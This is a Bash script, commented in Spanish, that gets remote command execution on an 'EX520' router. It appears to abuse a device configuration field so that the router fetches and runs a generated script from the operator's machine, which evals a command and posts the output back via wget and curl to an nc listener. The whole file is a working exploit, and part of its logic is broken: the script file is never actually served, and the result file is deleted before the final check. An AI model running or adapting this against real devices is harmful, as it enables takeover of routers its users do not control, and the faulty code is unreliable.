#!/bin/bash
# remote_exec.sh — Ejecutar comando remoto en EX520 vía phoenix.sh
#
# Uso:
#   ./remote_exec.sh "uname -a"
#   ./remote_exec.sh "ps"
#   ./remote_exec.sh "cat /proc/version"
#
# Requiere: .env con DETECTIC_PASSWORD, detectic binary compilado
#
# Crea un script temporal, lo sirve por HTTP, activa phoenix para que lo
# descargue y ejecute, y captura el resultado.

set -euo pipefail

source .env 2>/dev/null || true

EX520_URL="${EX520_URL:-http://[fe80::3e6a:d2ff:fe5f:abc1%25enp2s0]}"
EX520_USER="${EX520_USER:-user}"
DETECTIC_PASSWORD="${DETECTIC_PASSWORD:-}"
DETECTIC_BIN="${DETECTIC_BIN:-./dist/detectic-aarch64-musl}"
HOST_IP="${HOST_IP:-192.168.0.27}"
RESULT_PORT="${RESULT_PORT:-8083}"
TIMEOUT="${TIMEOUT:-20}"

CMD="${1:?Usage: $0 <command>}"
CMD_ID=$(date +%s%N | sha256sum | head -c 8)
RESULT_FILE="/tmp/ex520_result_${CMD_ID}.txt"
SCRIPT_DIR="/tmp/ex520_scripts"
RESULT_DIR="/tmp/ex520_results"

mkdir -p "$SCRIPT_DIR" "$RESULT_DIR"

# --- Cleanup old scripts/results ---
rm -f "$SCRIPT_DIR"/cmd_*.sh "$RESULT_DIR"/result_*.txt 2>/dev/null

# --- Create the execution script ---
SCRIPT_PATH="$SCRIPT_DIR/cmd_${CMD_ID}.sh"
RESULT_URL="http://${HOST_IP}:${RESULT_PORT}/result/${CMD_ID}"

cat > "$SCRIPT_PATH" << SCRIPT_EOF
#!/bin/sh
# EX520 remote command execution agent
# Command: $CMD
# ID: $CMD_ID

RESULT_URL="$RESULT_URL"

# Execute the command
OUTPUT=\$(eval '$CMD' 2>&1)
RC=\$?

# Try to send result back via wget (BusyBox)
wget -q -T $TIMEOUT -O /dev/null \\
    --post-data="id=$CMD_ID&rc=\$RC&output=\$(echo \$OUTPUT | head -c 8192)" \\
    "$RESULT_URL" 2>/dev/null

# Also try curl
curl -s -m $TIMEOUT -X POST \\
    -d "id=$CMD_ID" -d "rc=\$RC" -d "output=\$OUTPUT" \\
    "$RESULT_URL" 2>/dev/null

# Write to local log (for inspection if available)
echo "CMD_ID=$CMD_ID RC=\$RC" > /tmp/ex520_last_cmd.log
SCRIPT_EOF

chmod +x "$SCRIPT_PATH"

echo "[*] Command: $CMD"
echo "[*] Script: $SCRIPT_PATH"
echo "[*] Result URL: $RESULT_URL"

# --- Start result listener ---
echo "[*] Starting result listener on port $RESULT_PORT..."

# Kill any existing listener
fuser -k "$RESULT_PORT/tcp" 2>/dev/null || true

(
    while true; do
        # Use nc to listen for one POST request
        REQUEST=$(timeout $TIMEOUT nc -l -p "$RESULT_PORT" -q 1 2>/dev/null || true)
        
        # Extract body from POST
        BODY=$(echo "$REQUEST" | sed -n '/^\r$/,$ p' | tail -n +2)
        
        if echo "$BODY" | grep -q "id=$CMD_ID"; then
            echo "$BODY" > "$RESULT_FILE"
            echo "[+] Result received!"
            break
        fi
    done
) &
LISTENER_PID=$!

# --- Trigger execution on router ---
echo "[*] Activating phoenix.sh via GTPR..."
SCRIPT_URL="http://${HOST_IP}:${RESULT_PORT}/cmd_${CMD_ID}.sh"

DETECTIC_PASSWORD="$DETECTIC_PASSWORD" "$DETECTIC_BIN" \
    --url "$EX520_URL" --user "$EX520_USER" \
    set DEV2_LIFEMOTE_AGENT \
    "{\"enable\":\"1\",\"URL\":\"${SCRIPT_URL}\",\"stack\":\"0,0,0,0,0,0\",\"pstack\":\"0,0,0,0,0,0\"}" \
    2>/dev/null

echo "[*] Waiting for result (timeout: ${TIMEOUT}s)..."

# Wait for listener
WAITED=0
while [ $WAITED -lt $((TIMEOUT + 5)) ]; do
    if [ -f "$RESULT_FILE" ]; then
        echo "[+] Result:"
        cat "$RESULT_FILE"
        break
    fi
    sleep 1
    WAITED=$((WAITED + 1))
done

# Cleanup
kill $LISTENER_PID 2>/dev/null || true
fuser -k "$RESULT_PORT/tcp" 2>/dev/null || true

# Revert GTPR
DETECTIC_PASSWORD="$DETECTIC_PASSWORD" "$DETECTIC_BIN" \
    --url "$EX520_URL" --user "$EX520_USER" \
    set DEV2_LIFEMOTE_AGENT \
    '{"enable":"0","URL":"","stack":"0,0,0,0,0,0","pstack":"0,0,0,0,0,0"}' \
    2>/dev/null

rm -f "$SCRIPT_PATH" "$RESULT_FILE" 2>/dev/null

if [ ! -f "$RESULT_FILE" ]; then
    echo "[-] No result received within timeout"
    echo "[-] The command may have failed or the network may be slow"
    echo "[-] Check router logs at /var/tmp/lifemote_cpe_daemon.sh"
fi
